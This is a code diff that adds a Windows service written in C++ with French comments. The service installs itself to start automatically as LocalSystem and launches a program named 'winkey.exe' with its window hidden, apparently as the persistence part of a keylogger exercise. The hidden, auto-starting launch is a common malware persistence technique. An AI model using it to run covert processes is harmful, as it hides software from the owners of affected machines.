@@ -1,23 +1,292 @@
 #include "svc.hpp"
 
+#pragma comment(lib, "Advapi32.lib")
+
+// Variables globales pour le service
+SERVICE_STATUS g_ServiceStatus = {0};
+SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
+HANDLE g_ServiceStopEvent = INVALID_HANDLE_VALUE;
+PROCESS_INFORMATION g_ProcessInfo = {0};
+
+// Nom du service
+#define SERVICE_NAME _T("svc")
+
+
+
+// Fonction principale du service
+VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
+VOID WINAPI ServiceCtrlHandler(DWORD);
+DWORD WINAPI ServiceWorkerThread(LPVOID lpParam);
+
+
 int InstallService()
 {
-	return 0;
+	
+    SC_HANDLE schSCManager;
+    SC_HANDLE schService;
+    TCHAR szPath[MAX_PATH];
+
+    if (!GetModuleFileName(NULL, szPath, MAX_PATH))
+    {
+        _tprintf(_T("Cannot get module filename (%lu)\n"), GetLastError());
+        return 0;
+    }
+
+    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    if (NULL == schSCManager)
+    {
+        _tprintf(_T("OpenSCManager failed (%lu)\n"), GetLastError());
+        return 0;
+    }
+
+    schService = CreateService(
+        schSCManager,              // SCM database
+        SERVICE_NAME,              // name of service
+        SERVICE_NAME,              // service name to display
+        SERVICE_ALL_ACCESS,        // desired access
+        SERVICE_WIN32_OWN_PROCESS, // service type
+        SERVICE_AUTO_START,        // start type
+        SERVICE_ERROR_NORMAL,      // error control type
+        szPath,                    // path to service's binary
+        NULL,                      // no load ordering group
+        NULL,                      // no tag identifier
+        NULL,                      // no dependencies
+        NULL,                      // LocalSystem account
+        NULL);                     // no password
+
+    if (schService == NULL)
+    {
+        _tprintf(_T("CreateService failed (%lu)\n"), GetLastError());
+        CloseServiceHandle(schSCManager);
+        return 0;
+    }
+
+    _tprintf(_T("Service installed successfully\n"));
+    CloseServiceHandle(schService);
+    CloseServiceHandle(schSCManager);
+    return 1;
 }
 
 int StartService()
 {
-	return 0;
+	  SERVICE_TABLE_ENTRY ServiceTable[] =
+    {
+        {SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION) ServiceMain},
+        {NULL, NULL}
+    };
+
+    if (StartServiceCtrlDispatcher(ServiceTable) == FALSE)
+    {
+        _tprintf(_T("StartServiceCtrlDispatcher failed (%lu)\n"), GetLastError());
+        return 0;
+    }
+    return 1;
 }
 
 int StopService()
 {
-	return 0;
+	SC_HANDLE schSCManager;
+    SC_HANDLE schService;
+    SERVICE_STATUS ssStatus;
+
+    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    if (schSCManager == NULL)
+    {
+        _tprintf(_T("OpenSCManager failed (%lu)\n"), GetLastError());
+        return 0;
+    }
+
+    schService = OpenService(schSCManager, SERVICE_NAME, SERVICE_STOP | SERVICE_QUERY_STATUS);
+    if (schService == NULL)
+    {
+        _tprintf(_T("OpenService failed (%lu)\n"), GetLastError());
+        CloseServiceHandle(schSCManager);
+        return 0;
+    }
+
+    if (!ControlService(schService, SERVICE_CONTROL_STOP, &ssStatus))
+    {
+        _tprintf(_T("ControlService failed (%lu)\n"), GetLastError());
+    }
+    else
+    {
+        _tprintf(_T("Service stopped successfully\n"));
+    }
+
+    CloseServiceHandle(schService);
+    CloseServiceHandle(schSCManager);
+    return 1;
 }
 
 int DeleteService()
 {
-	return 0;
+	 SC_HANDLE schSCManager;
+    SC_HANDLE schService;
+
+    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    if (schSCManager == NULL)
+    {
+        _tprintf(_T("OpenSCManager failed (%lu)\n"), GetLastError());
+        return 0;
+    }
+
+    schService = OpenService(schSCManager, SERVICE_NAME, DELETE);
+    if (schService == NULL)
+    {
+        _tprintf(_T("OpenService failed (%lu)\n"), GetLastError());
+        CloseServiceHandle(schSCManager);
+        return 0;
+    }
+
+    if (!DeleteService(schService))
+    {
+        _tprintf(_T("DeleteService failed (%lu)\n"), GetLastError());
+    }
+    else
+    {
+        _tprintf(_T("Service deleted successfully\n"));
+    }
+
+    CloseServiceHandle(schService);
+    CloseServiceHandle(schSCManager);
+    return 1;
+}
+
+
+VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
+{
+    // DWORD Status = E_FAIL;
+
+	UNREFERENCED_PARAMETER(argc);
+    UNREFERENCED_PARAMETER(argv);
+
+    g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);
+    if (g_StatusHandle == NULL)
+    {
+        return;
+    }
+
+    ZeroMemory(&g_ServiceStatus, sizeof(g_ServiceStatus));
+    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
+    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
+    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
+    g_ServiceStatus.dwWin32ExitCode = 0;
+    g_ServiceStatus.dwServiceSpecificExitCode = 0;
+    g_ServiceStatus.dwCheckPoint = 0;
+
+    if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
+    {
+        return;
+    }
+
+    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+    if (g_ServiceStopEvent == NULL)
+    {
+        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
+        g_ServiceStatus.dwWin32ExitCode = GetLastError();
+        g_ServiceStatus.dwCheckPoint = 1;
+        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
+        return;
+    }
+
+    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
+    g_ServiceStatus.dwWin32ExitCode = 0;
+    g_ServiceStatus.dwCheckPoint = 0;
+
+    if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
+    {
+        return;
+    }
+
+    HANDLE hThread = CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL);
+    if (hThread != NULL)
+    {
+        WaitForSingleObject(hThread, INFINITE);
+        CloseHandle(hThread);
+    }
+
+    CloseHandle(g_ServiceStopEvent);
+
+    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
+    g_ServiceStatus.dwWin32ExitCode = 0;
+    g_ServiceStatus.dwCheckPoint = 3;
+    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
+}
+
+VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode)
+{
+    switch (CtrlCode)
+    {
+    case SERVICE_CONTROL_STOP:
+        if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
+            break;
+
+        g_ServiceStatus.dwControlsAccepted = 0;
+        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
+        g_ServiceStatus.dwWin32ExitCode = 0;
+        g_ServiceStatus.dwCheckPoint = 4;
+        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
+
+        // Terminer le processus winkey.exe
+        if (g_ProcessInfo.hProcess != NULL)
+        {
+            TerminateProcess(g_ProcessInfo.hProcess, 0);
+            CloseHandle(g_ProcessInfo.hProcess);
+            CloseHandle(g_ProcessInfo.hThread);
+        }
+
+        SetEvent(g_ServiceStopEvent);
+        break;
+
+    default:
+        break;
+    }
+}
+
+DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
+{
+	UNREFERENCED_PARAMETER(lpParam);
+    STARTUPINFO si;
+    TCHAR szPath[MAX_PATH];
+    TCHAR szDir[MAX_PATH];
+
+    // Obtenir le répertoire du service
+    GetModuleFileName(NULL, szPath, MAX_PATH);
+    _tcscpy_s(szDir, MAX_PATH, szPath);
+    TCHAR* lastSlash = _tcsrchr(szDir, _T('\\'));
+    if (lastSlash) *lastSlash = _T('\0');
+
+    // Construire le chemin vers winkey.exe
+    _stprintf_s(szPath, MAX_PATH, _T("%s\\winkey.exe"), szDir);
+
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE; // Cacher la fenêtre
+
+    ZeroMemory(&g_ProcessInfo, sizeof(g_ProcessInfo));
+
+    // Lancer winkey.exe
+    if (!CreateProcess(NULL, szPath, NULL, NULL, FALSE, 0, NULL, szDir, &si, &g_ProcessInfo))
+    {
+        // Échec du lancement
+        return ERROR_PROCESS_ABORTED;
+    }
+
+    // Attendre que le service soit arrêté ou que le processus se ferme
+    HANDLE handles[2] = { g_ServiceStopEvent, g_ProcessInfo.hProcess };
+    DWORD waitResult = WaitForMultipleObjects(2, handles, FALSE, INFINITE);
+
+    if (waitResult == WAIT_OBJECT_0)
+    {
+        // Service arrêté - terminer le processus
+        TerminateProcess(g_ProcessInfo.hProcess, 0);
+    }
+
+    CloseHandle(g_ProcessInfo.hProcess);
+    CloseHandle(g_ProcessInfo.hThread);
+
+    return ERROR_SUCCESS;
 }
 
 int _tmain(int arc, TCHAR *argv[])
